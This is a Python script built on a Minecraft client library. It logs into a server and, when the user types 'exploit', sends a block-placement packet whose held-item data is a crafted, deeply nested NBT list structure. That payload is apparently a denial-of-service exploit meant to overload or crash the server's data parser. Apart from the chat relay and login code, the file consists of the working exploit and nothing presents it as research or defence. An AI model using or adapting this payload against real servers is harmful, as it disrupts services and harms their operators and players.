import getpass
import sys
import struct
from optparse import OptionParser
from io import BytesIO

from minecraft import authentication
from minecraft.exceptions import YggdrasilError
from minecraft.networking.connection import Connection
from minecraft.networking.packets import ChatMessagePacket, ChatPacket
from minecraft.networking.packets import BlockPlacementPacket, PacketBuffer
from minecraft.compat import input


def get_options():
    parser = OptionParser()

    parser.add_option("-u", "--username", dest="username", default=None,
                      help="username to log in with")

    parser.add_option("-p", "--password", dest="password", default=None,
                      help="password to log in with")

    parser.add_option("-s", "--server", dest="server", default=None,
                      help="server to connect to")

    (options, args) = parser.parse_args()

    if not options.username:
        options.username = input("Enter your username: ")

    if not options.password:
        options.password = getpass.getpass("Enter your password: ")

    if not options.server:
        options.server = input("Please enter server address"
                               " (including port): ")
    # Try to split out port and address
    if ':' in options.server:
        server = options.server.split(":")
        options.address = server[0]
        options.port = int(server[1])
    else:
        options.address = options.server
        options.port = 25565

    return options

def tag_id_and_name(nbt_id, name, data):
    data.write(struct.pack('>b', nbt_id))
    name = name.encode('utf-8')
    data.write(struct.pack('>h', len(name)))
    data.write(name)

def write_lists(recursion_count, data):
    if recursion_count > 4:
        return

    tag_id_and_name(9, "", data)
    data.write(struct.pack('>b', 9))
    data.write(struct.pack('>i', 10))
    for i in range(10):
        write_lists(recursion_count + 1, data)

def generate_exploitative_nbt():
    data = BytesIO()

    tag_id_and_name(10, "rekt", data)

    for i in range(10):
        if i % 20 == 0:
            print("List count: " + str(i))
        write_lists(0, data)

    data.write(struct.pack('>b', 0))
    return data.getvalue()


def main():
    exploit_data = generate_exploitative_nbt()
    print("Exploit length: " + str(len(exploit_data)))

    exploit_packet_data = PacketBuffer()

    exploit_packet = BlockPlacementPacket()
    exploit_packet.X = 0
    exploit_packet.Y = 0
    exploit_packet.Z = 0
    exploit_packet.direction = 0
    exploit_packet.face = 0
    exploit_packet.held_item_id = 1
    exploit_packet.held_item_count = 1
    exploit_packet.held_item_damage = 0
    exploit_packet.held_item_nbt = exploit_data
    exploit_packet.cursor_position_x = 0
    exploit_packet.cursor_position_y = 0
    exploit_packet.cursor_position_z = 0

    exploit_packet.write(exploit_packet_data, compression_threshold=500)
    exploit_packet_data = exploit_packet_data.get_writable()

    print("Exploit packet length: " + str(len(exploit_packet_data)))

    options = get_options()

    auth_token = authentication.AuthenticationToken()
    try:
        auth_token.authenticate(options.username, options.password)
    except YggdrasilError as e:
        print(e)
        sys.exit()

    print("Logged in as " + auth_token.username)

    connection = Connection(options.address, options.port, auth_token)
    connection.connect()

    def print_chat(chat_packet):
        print("Message: " + chat_packet.json_data)

    connection.register_packet_listener(print_chat, ChatMessagePacket)
    while True:
        try:
            text = input()
            if text == "exploit":
                connection.write_raw(exploit_packet_data)
                #connection.write_packet(exploit_packet)
            else:
                packet = ChatPacket()
                packet.message = text
                connection.write_packet(packet)
        except KeyboardInterrupt:
            print("Bye!")
            sys.exit()


if __name__ == "__main__":
    main()
